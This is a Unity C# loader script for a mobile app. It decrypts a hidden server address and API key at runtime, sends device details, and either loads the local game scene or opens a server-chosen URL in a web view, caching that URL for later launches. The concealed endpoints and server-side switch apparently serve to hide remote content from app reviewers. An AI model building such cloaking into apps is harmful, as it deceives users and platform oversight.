using Newtonsoft.Json.Linq;
using OneSignalSDK;
using Services.S;
using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.SceneManagement;
using UnityEngine.UI;

namespace Services
{
    public class AppLoader : MonoBehaviour
    {
        [SerializeField] private string main_Scheme; //Format
        [SerializeField] private string main_DomainName;
        [SerializeField] private string main_ApiKey;

        [Header("OS"), TextArea, SerializeField] private string main_OSScheme;

        [SerializeField] private string bundleKey;

        [Space]
        [SerializeField] SDataChecker checker;
        [SerializeField] private TMPro.TMP_Text logLable;

        private const string SavedDataKey = "18d071ce-44a2-4e54-a583-dcb105c69ff8";

        #region sec

        [ContextMenu("Encrypt in data")]
        private void EncryptIn() => CryptIn(true);

        [ContextMenu("Decrypt in data")]
        private void DecryptIn() => CryptIn(false);

        private void CryptIn(bool isEncrypt)
        {
            main_DomainName = StringCodeService.CryptSwitch(main_DomainName, bundleKey, isEncrypt);
            main_ApiKey = StringCodeService.CryptSwitch(main_ApiKey, bundleKey, isEncrypt);
            main_Scheme = StringCodeService.CryptSwitch(main_Scheme, bundleKey, isEncrypt);

            main_OSScheme = StringCodeService.CryptSwitch(main_OSScheme, bundleKey, isEncrypt);
        }

        #endregion

        public class InData
        {
            public string device_model;

            public InData()
            {
                device_model = SystemInfo.deviceModel;
            }
        }

        private void Start()
        {
            OneSignal.Initialize(SavedDataKey);

            if (Application.internetReachability == NetworkReachability.NotReachable)
            {
                PrintLog(Application.internetReachability.ToString());
                CancelLoad();
            }
            else
            {
                Initialize();
            }
        }

        private async Task Initialize()
        {
            var needCheck = await checker.NeedCheckServer();
            if (!needCheck)
            {
                CancelLoad();
                return;
            }

            var startLink = PlayerPrefs.GetString(SavedDataKey, "null");
            if (startLink == "null")
            {
                Task<string> response = Request(string.Format(
                    StringCodeService.Decrypt(main_Scheme, bundleKey),
                    StringCodeService.Decrypt(main_DomainName, bundleKey),
                    StringCodeService.Decrypt(main_ApiKey, bundleKey),
                    SystemInfo.deviceModel));

                await response;

                CheckResponse(response);
            }
            else
            {
                ViewFactory.Instance.Show(startLink);
            }
        }

        private void CheckResponse(Task<string> _task)
        {
            if (!_task.IsFaulted)
            {
                var jsonObj = JObject.Parse(_task.Result);

                if (jsonObj.ContainsKey("response"))
                {
                    var response = jsonObj.Property("response").Value.ToString();

                    if (string.IsNullOrEmpty(response))
                    {
                        PrintLog("resp is empty");
                        CancelLoad();
                    }
                    else if (response.Contains("privacy"))
                    {
                        CancelLoad();
                    }
                    else
                    {
                        ViewFactory.Instance.Show(response);
                        StartCoroutine(ReqOS(jsonObj.Property("client_id")?.Value.ToString()));
                    }
                }
                else
                {
                    CancelLoad();
                    PrintLog(_task.Exception.ToString());
                }
            }
            else
            {
                PrintLog("Fail");

                CancelLoad();
            }
        }

        IEnumerator ReqOS(string _clientId)
        {
            yield return new WaitWhile(() => string.IsNullOrEmpty(OneSignal.Default?.User?.OneSignalId));

            var os = Request(string.Format(
                StringCodeService.Decrypt(main_OSScheme, bundleKey),
                _clientId,
                OneSignal.Default?.User?.OneSignalId));

            PlayerPrefs.SetString(SavedDataKey, ViewFactory.Instance.CurrentUrl);
            PlayerPrefs.Save();
        }

        public async Task<string> Request(string url, InData indata = null)
        {
            indata = new InData();

            var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
            httpWebRequest.UserAgent = string.Join(", ", new string[] { SystemInfo.operatingSystem, SystemInfo.deviceModel });
            httpWebRequest.Headers.Set(HttpRequestHeader.AcceptLanguage, Application.systemLanguage.ToString());
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";
            httpWebRequest.Timeout = 12000;

            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                string json = JsonUtility.ToJson(indata);
                streamWriter.Write(json);
            }

            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                return await streamReader.ReadToEndAsync();
            }
        }

        private void CancelLoad()
        {
            if (PlayerPrefs.HasKey(SavedDataKey))
            {
                OneSignal.Notifications?.ClearAllNotifications();
                OneSignal.Logout();
            }

            SceneManager.LoadScene(1);
        }


        private void PrintLog(string msg)
        {
            logLable.text += (msg + '\n');
        }

        [ContextMenu("Clear Prefs")]
        private void ClearPrefs() => PlayerPrefs.DeleteAll();
    }
}
